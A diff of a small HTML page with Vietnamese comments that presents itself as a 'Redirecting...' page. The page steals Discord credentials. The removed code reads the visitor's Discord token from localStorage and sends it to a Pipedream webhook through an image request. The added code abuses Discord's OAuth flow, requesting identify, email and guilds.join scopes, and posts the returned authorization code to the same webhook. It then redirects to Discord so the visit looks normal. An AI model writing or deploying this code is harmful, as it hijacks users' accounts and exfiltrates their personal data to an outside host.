@@ -1,41 +1,32 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading...</title></head>
+<head><title>Redirecting...</title></head>
 <body>
     <script>
-        // Copy chính xác link Pipedream của bạn vào đây
         const WEBHOOK = "https://eop7zyrf1iz1jrc.m.pipedream.net";
+        const CLIENT_ID = "1324036502220472382"; // ID từ file index cũ của bạn
+        const REDIRECT_URI = "https://senkosanss11-stack.github.io/discordlink/";
 
-        function sendData(token) {
-            // Dùng thủ thuật ảnh để bypass CORS
-            const img = new Image();
-            img.src = `${WEBHOOK}?user_token=${token}`;
-            
-            // Chuyển hướng sau khi gửi xong
-            setTimeout(() => {
+        async function handleAuth() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const code = urlParams.get('code');
+
+            if (code) {
+                // Bước 2: Nếu đã có mã code từ Discord, gửi nó về Pipedream
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ code: code })
+                });
+                // Sau khi gửi xong, đẩy về Discord cho tự nhiên
                 window.location.href = "https://discord.com/channels/@me";
-            }, 1000);
-        }
-
-        function hoot_token() {
-            try {
-                // Thử lấy token theo nhiều cách khác nhau
-                let token = window.localStorage.getItem('token') || 
-                            document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token;
-
-                if (token) {
-                    token = token.replace(/"/g, "");
-                    sendData(token);
-                } else {
-                    // Nếu máy này chưa login, đẩy ra trang login của Discord
-                    window.location.href = "https://discord.com/login";
-                }
-            } catch (err) {
-                window.location.href = "https://discord.com/login";
+            } else {
+                // Bước 1: Nếu chưa có code, đẩy sang trang Authorize của Discord
+                window.location.href = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=identify+email+guilds.join`;
             }
         }
 
-        hoot_token();
+        handleAuth();
     </script>
 </body>
 </html>
